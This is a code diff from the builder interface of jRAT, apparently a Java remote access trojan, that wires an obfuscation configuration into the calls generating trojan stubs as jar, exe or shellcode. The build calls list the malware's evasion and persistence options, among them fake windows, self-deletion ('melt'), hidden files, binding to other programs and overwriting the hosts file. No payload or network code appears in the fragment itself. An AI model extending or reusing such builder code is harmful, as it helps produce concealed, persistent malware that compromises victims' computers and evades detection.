@@ -23,6 +23,8 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.ScrollPaneConstants;
 import javax.swing.table.DefaultTableModel;
 
+import com.redpois0n.zkmlib.Configuration;
+
 import pro.jrat.client.BuildStatus;
 import pro.jrat.client.ErrorDialog;
 import pro.jrat.client.OSConfig;
@@ -217,6 +219,7 @@ public class PanelBuildFinal extends JPanel {
 					int persistancems = per.getMS();
 					boolean debugmsg = pdebug.keepDebugMessages();
 					OSConfig osconfig = os.getConfig();
+					Configuration config = out.obfuscate() ? out.frameObfuscationInfo.getConfig() : null;
 
 					if (key.getTextualKey().length() != Crypto.KEY_LENGTH) {
 						throw new InvalidKeyException("Encryption key has to be " + Crypto.KEY_LENGTH + " chars");
@@ -228,7 +231,7 @@ public class PanelBuildFinal extends JPanel {
 
 					if (out.useShellcode()) {
 						File temp = File.createTempFile("jratbuild", ".jar");
-						Build.build(new AdvancedBuildListener(frame), Files.getStub(), temp, addresses, ID, pass, key, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, out.obfuscate());
+						Build.build(new AdvancedBuildListener(frame), Files.getStub(), temp, addresses, ID, pass, key, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, config);
 
 						if (!file.endsWith(".jar")) {
 							file = file + ".jar";
@@ -239,7 +242,7 @@ public class PanelBuildFinal extends JPanel {
 					} else if (out.useExe()) {
 						File temp = File.createTempFile("jratbuild", ".jar");
 
-						Build.build(new AdvancedBuildListener(frame), Files.getStub(), temp, addresses, ID, pass, key, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, out.obfuscate());
+						Build.build(new AdvancedBuildListener(frame), Files.getStub(), temp, addresses, ID, pass, key, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, config);
 
 						if (!file.toLowerCase().endsWith(".exe")) {
 							file = file + ".exe";
@@ -249,7 +252,7 @@ public class PanelBuildFinal extends JPanel {
 
 						temp.delete();
 					} else {				
-						Build.build(new AdvancedBuildListener(frame), Files.getStub(), new File(file), addresses, ID, pass, key, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, out.obfuscate());			
+						Build.build(new AdvancedBuildListener(frame), Files.getStub(), new File(file), addresses, ID, pass, key, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, config);		
 					}
 
 					String rawAddresses = "";
